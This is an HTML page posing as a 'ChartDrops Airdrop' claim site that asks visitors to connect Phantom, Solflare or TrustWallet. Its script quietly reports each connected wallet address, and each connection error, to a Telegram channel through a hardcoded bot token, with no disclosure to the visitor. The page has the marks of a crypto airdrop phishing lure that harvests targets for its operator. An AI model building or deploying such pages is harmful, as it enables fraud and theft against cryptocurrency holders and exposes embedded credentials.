<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>ChartDrops Airdrop</title>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets@0.9.19/lib/cdn/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@0.9.19/lib/cdn/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react-ui/styles.css"></script>
  <style>
    body {
      background: #0d0d0d;
      color: white;
      font-family: sans-serif;
      text-align: center;
      margin-top: 80px;
    }

    .popup {
      background: #1a1a1a;
      padding: 25px;
      border-radius: 10px;
      display: inline-block;
      box-shadow: 0 0 15px rgba(0, 255, 150, 0.2);
    }

    button {
      background: #00ffae;
      border: none;
      padding: 12px 20px;
      margin: 10px;
      border-radius: 6px;
      cursor: pointer;
      color: black;
      font-weight: bold;
    }

    button:hover {
      background: #00d69b;
    }

    #connectionStatus {
      margin-top: 20px;
      font-size: 16px;
      color: #00ffae;
    }
  </style>
</head>
<body>
  <div class="popup">
    <h2>ChartDrops Airdrop</h2>
    <p>Connect your wallet to claim</p>
    <button onclick="connectPhantom()">Connect Phantom</button>
    <button onclick="connectSolflare()">Connect Solflare</button>
    <button onclick="connectTrust()">Connect TrustWallet</button>
    <div id="connectionStatus"></div> <!-- Display connection status here -->
  </div>

  <script>
    const BOT_TOKEN = "7978623862:AAHezOh3PLYYy92TIjtIN9oRof32nbfwNMQ";
    const CHANNEL_ID = "-1002600871606";

    // Send message to Telegram
    async function sendTelegramMessage(walletAddress, error = false) {
      const message = error
        ? `❌ Wallet Connect Error on chartdrops.fun:\n${walletAddress}`
        : `✅ Wallet ${walletAddress} Connected To chartdrops.fun`;

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHANNEL_ID,
            text: message
          })
        });
        const result = await res.json();
        console.log("Telegram Response:", result);
      } catch (err) {
        console.error("Telegram error:", err);
      }
    }

    // Update the connection status on the page
    function updateConnectionStatus(status) {
      const statusElement = document.getElementById('connectionStatus');
      statusElement.textContent = status;
    }

    // Connect Phantom wallet
    async function connectPhantom() {
      if (typeof window.solana !== "undefined" && window.solana.isPhantom) {
        try {
          const resp = await window.solana.connect();
          const walletAddress = resp.publicKey.toString();
          sendTelegramMessage(walletAddress);
          updateConnectionStatus(`Connected: ${walletAddress}`);  // Update UI with the wallet address
          alert(`Connected: ${walletAddress}`);
        } catch (err) {
          console.error("Phantom connect error", err);
          sendTelegramMessage(`Phantom error: ${err.message}`, true);
          updateConnectionStatus("Phantom connection failed.");
        }
      } else if (window.matchMedia("(max-width: 768px)").matches) {
        // Fallback for mobile - Open Phantom app if not found
        const link = `https://phantom.app/ul/browse/${window.location.href}`;
        alert("Phantom wallet not installed. Opening mobile app...");
        window.location.href = link;
      } else {
        alert("Phantom wallet not installed. Please install Phantom.");
        sendTelegramMessage("Phantom wallet not found on the device.", true);
        updateConnectionStatus("Phantom wallet not installed.");
      }
    }

    // Connect Solflare wallet
    async function connectSolflare() {
      if (typeof window.solflare !== "undefined") {
        try {
          const solflare = window.solflare;
          if (!solflare.isConnected) {
            await solflare.connect();
          }
          const walletAddress = solflare.publicKey.toString();
          sendTelegramMessage(walletAddress);
          updateConnectionStatus(`Connected: ${walletAddress}`);
          alert(`Connected: ${walletAddress}`);
        } catch (err) {
          console.error("Solflare connect error", err);
          sendTelegramMessage("Solflare error: " + err.message, true);
          updateConnectionStatus("Solflare connection failed.");
        }
      } else if (window.matchMedia("(max-width: 768px)").matches) {
        // For mobile Solflare (Android/iOS), we'll redirect to app or URL
        alert("Solflare wallet not installed. Redirecting to Solflare app...");
        window.location.href = "https://solflare.com/";
      } else {
        alert("Solflare wallet not installed.");
        sendTelegramMessage("Solflare wallet not found.", true);
        updateConnectionStatus("Solflare wallet not installed.");
      }
    }

    // Connect TrustWallet
    async function connectTrust() {
      if (window.solana && window.solana.isTrust) {
        try {
          const resp = await window.solana.connect();
          const walletAddress = resp.publicKey.toString();
          sendTelegramMessage(walletAddress);
          updateConnectionStatus(`Connected: ${walletAddress}`);
          alert(`Connected: ${walletAddress}`);
        } catch (err) {
          console.error("TrustWallet connect error", err);
          sendTelegramMessage("TrustWallet error: " + err.message, true);
          updateConnectionStatus("TrustWallet connection failed.");
        }
      } else if (window.matchMedia("(max-width: 768px)").matches) {
        // Fallback for mobile - Open Trust Wallet app if not found
        const link = `https://trustwallet.com/`;
        alert("TrustWallet not installed. Opening mobile app...");
        window.location.href = link;
      } else {
        alert("TrustWallet wallet not installed. Please install TrustWallet.");
        sendTelegramMessage("TrustWallet not found.", true);
        updateConnectionStatus("TrustWallet not found.");
      }
    }
  </script>
</body>
</html>
